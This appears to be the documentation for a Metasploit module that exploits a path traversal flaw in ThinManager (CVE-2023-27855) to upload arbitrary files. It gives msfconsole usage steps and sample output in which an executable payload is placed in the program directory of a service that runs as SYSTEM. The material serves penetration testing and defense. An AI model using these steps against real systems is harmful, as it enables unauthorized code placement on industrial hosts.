## Vulnerable Application

This module exploits a path traversal vulnerability in ThinManager <= v13.0.1 (CVE-2023-27855) to upload an arbitrary file to the target
system.

The affected service listens by default on TCP port 2031 and runs in the context of NT AUTHORITY\SYSTEM.

## Testing

The software can be obtained from
[the vendor](https://thinmanager.com/downloads/).

**Successfully tested on**

- ThinManager v13.0.1 on Windows 22H2
- ThinManager v13.0.0 on Windows 22H2
- ThinManager v12.1.5 on Windows 22H2
- ThinManager v10.0.2 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/admin/networking/thinmanager_traversal_upload 
msf6 auxiliary(admin/networking/thinmanager_traversal_upload) > set RHOSTS <IP>
msf6 auxiliary(admin/networking/thinmanager_traversal_upload) > set LFILE <local file location>
msf6 auxiliary(admin/networking/thinmanager_traversal_upload) > set RFILE <remote file location>
msf6 auxiliary(admin/networking/thinmanager_traversal_upload) > run
```

This should upload the local file specified through LFILE to the server, as specified in RFILE.

## Options

### LFILE
Specifies the local file to upload to the remote server.

### RFILE
Specifies the remote file location where the file will be uploaded to.

## Scenarios

Running the exploit against ThinManager v13.0.1 on Windows 22H2 should result in an output similar to the following:

```
msf6 auxiliary(admin/networking/thinmanager_traversal_upload) > run
[*] Running module against 192.168.137.227

[*] 192.168.137.227:2031 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.168.137.227:2031 - The service is running, but could not be validated.
[*] 192.168.137.227:2031 - Sending handshake...
[*] 192.168.137.227:2031 - Received handshake response.
[*] 192.168.137.227:2031 - Read 27648 bytes from /tmp/payload.exe
[*] 192.168.137.227:2031 - Uploading /tmp/payload.exe as /Program Files/Rockwell Software/ThinManager/payload.exe on the remote host...
[*] 192.168.137.227:2031 - Upload request length: 27752 bytes
[!] 192.168.137.227:2031 - No response received after upload.
[+] 192.168.137.227:2031 - Upload process completed. Check if '/Program Files/Rockwell Software/ThinManager/payload.exe' exists on the target.
[*] Auxiliary module execution completed
```
